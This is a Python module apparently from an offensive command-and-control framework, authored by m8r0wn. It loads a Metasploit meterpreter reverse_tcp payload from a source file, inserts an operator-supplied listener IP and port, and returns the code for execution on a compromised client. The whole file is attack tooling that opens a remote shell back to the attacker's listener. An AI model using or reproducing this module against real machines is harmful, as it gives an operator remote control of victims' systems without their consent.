class TransModule:
    def __init__(self):
        self.name = "msfpayload"
        self.description = "Execute python/meterpreter/reverse_tcp payload on client"
        self.author = "m8r0wn"
        self.language = ['python']
        self.usage = "msfpayload 127.0.0.1 4444"

        self.options = {
            'IP'    : {'Description'    : "IP address of Metasploit listener",
                    'Value'             : '0.0.0.0'
                       },

            'Port'  : {'Description' : "Port of Metasploit listener",
                       'Value': '4444'
                       },
            }

    def args(self, cmd):
        # Parse args from user cmd and add to class obj
        arg = cmd.split(" ")
        self.options['IP']['Value']     = arg[1]
        self.options['Port']['Value']   = arg[2]

    def run(self, cmd):
        self.args(cmd)
        # Read in module code
        with open("server/AdminServer/modules/src/msfpayload.py", "r") as module:
            src = module.read()
            # Replace vars in payload
            src = src.replace("MSFHOST", self.options['IP']['Value'])
            src = src.replace("MSFPORT", self.options['Port']['Value'])
            # Return code to api for execution on client
            return src